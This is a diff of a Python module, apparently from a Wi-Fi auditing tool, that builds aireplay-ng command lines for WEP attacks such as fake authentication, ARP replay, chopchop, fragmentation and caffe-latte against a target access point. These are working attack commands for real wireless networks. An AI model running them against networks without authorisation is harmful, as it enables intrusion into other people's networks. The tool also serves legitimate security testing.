@@ -5,41 +5,108 @@ from Process import Process
 
 class WEPAttackType(object):
     ''' Enumeration of different WEP attack types '''
-    replay = 0
-    chopchop = 1
-    fragmentation = 2
-    caffelatte = 3
-    p0841 = 4
-    hirte = 5
+    fakeauth   = 0
+    replay     = 1
+    chopchop   = 2
+    fragment   = 3
+    caffelatte = 4
+    p0841      = 5
+    hirte      = 6
+
+    def __init__(self, var):
+        '''
+            Sets appropriate attack name/value given an input.
+            Args:
+                var - Can be a string, number, or WEPAttackType object
+                      This object's name & value is set depending on var.
+        '''
+        self.value = None
+        self.name = None
+        if type(var) == int:
+            for (name,value) in WEPAttackType.__dict__.iteritems():
+                if type(value) == int:
+                    if value == var:
+                        self.name = name
+                        self.value = value
+                        return
+            raise Exception("Attack number %d not found" % var)
+        elif type(var) == str:
+            for (name,value) in WEPAttackType.__dict__.iteritems():
+                if type(value) == int:
+                    if name == var:
+                        self.name = name
+                        self.value = value
+                        return
+            raise Exception("Attack name %s not found" % var)
+        elif type(var) == WEPAttackType:
+            self.name = var.name
+            self.value = var.value
+        else:
+            raise Exception("Attack type not supported")
+
+    def __str__(self):
+        return self.name
 
 
 class Aireplay(object):
-    def __init__(self):
-        self.pid = None # Process instance for aireplay-ng
-        self.attack_type = None
+    def __init__(self, target, attack_type):
+        '''
+            Starts aireplay process.
+            Args:
+                target - Instance of Target object, AP to attack.
+                attack_type - int, str, or WEPAttackType instance.
+        '''
+        cmd = Aireplay.get_aireplay_command(target, attack_type)
+        self.pid = Process(cmd, devnull=False)
 
-    def run_wep_attack(self, target, attack_type):
-        ''' Starts aireplay process '''
-        cmd = self.get_aireplay_command(target, attack_type)
-        if self.pid and self.pid.poll() != None:
-            # Aireplay is already running, kill it
-            self.pid.interrupt()
-        self.pid = Process(cmd, devnull=True)
+    def is_running(self):
+        return self.pid.poll() == None
 
-    def stop_wep_attack(self):
+    def stop(self):
         ''' Stops aireplay process '''
         if self.pid and self.pid.poll() != None:
             self.pid.interrupt()
 
-    def get_aireplay_command(self, target, attack_type):
-        ''' Generates aireplay command based on target and attack type '''
+    def get_output(self):
+        ''' Returns stdout from aireplay process '''
+        return self.pid.stdout()
+
+    @staticmethod
+    def get_aireplay_command(target, attack_type):
+        '''
+            Generates aireplay command based on target and attack type
+            Args:
+                target - Instance of Target object, AP to attack.
+                attack_type - int, str, or WEPAttackType instance.
+        '''
+
+        # Interface is required at this point
+        Configuration.initialize()
+        if Configuration.interface == None:
+            raise Exception("Wireless interface must be defined (-i)")
+            
         cmd = ['aireplay-ng']
         cmd.append('--ignore-negative-one')
         client_mac = None
         if len(target.clients) > 0:
             client_mac = target.clients[0].station
 
-        if attack_type == WEPAttackType.replay:
+        # type(attack_type) might be str, int, or WEPAttackType.
+        # Find the appropriate attack enum.
+        attack_type = WEPAttackType(attack_type).value
+
+        if attack_type == WEPAttackType.fakeauth:
+            cmd.extend(['-1', '0']) # Fake auth, no delay
+            cmd.extend(['-a', target.bssid])
+            cmd.extend(['-T', '1']) # Make 1 attemp
+            if target.essid_known:
+                cmd.extend(['-e', target.essid])
+
+            # TODO Should we specify the source MAC as a client station?
+            #if client_mac:
+            #    cmd.extend(['-h', client_mac])
+
+        elif attack_type == WEPAttackType.replay:
             cmd.append('--arpreplay')
             cmd.extend(['-b', target.bssid])
             cmd.extend(['-x', str(Configuration.wep_pps)])
@@ -56,7 +123,7 @@ class Aireplay(object):
             if client_mac:
                 cmd.extend(['-h', client_mac])
 
-        elif attack_type == WEPAttackType.fragmentation:
+        elif attack_type == WEPAttackType.fragment:
             cmd.append('--fragment')
             cmd.extend(['-b', target.bssid])
             cmd.extend(['-x', str(Configuration.wep_pps)])
@@ -88,19 +155,27 @@ class Aireplay(object):
                 raise Exception("Client is required for hirte attack")
             cmd.append('--cfrag')
             cmd.extend(['-h', client_mac])
+        else:
+            raise Exception("Unexpected attack type: %s" % attack_type)
 
         cmd.append(Configuration.interface)
         return cmd
 
 
 if __name__ == '__main__':
-    Configuration.initialize()
+    t = WEPAttackType(4)
+    print t.name, type(t.name), t.value
 
-    a = Aireplay()
+    t = WEPAttackType('caffelatte')
+    print t.name, type(t.name), t.value
+
+    t = WEPAttackType(t)
+    print t.name, type(t.name), t.value
 
     from Target import Target
     fields = 'AA:BB:CC:DD:EE:FF, 2015-05-27 19:28:44, 2015-05-27 19:28:46,  1,  54, WPA2, CCMP TKIP,PSK, -58,        2,        0,   0.  0.  0.  0,   9, HOME-ABCD, '.split(',')
     t = Target(fields)
 
-    print ' '.join(a.get_aireplay_command(t, WEPAttackType.replay))
+    cmd = Aireplay.get_aireplay_command(t, 'fakeauth')
+    print ' '.join(['"%s"' % a for a in cmd])
 
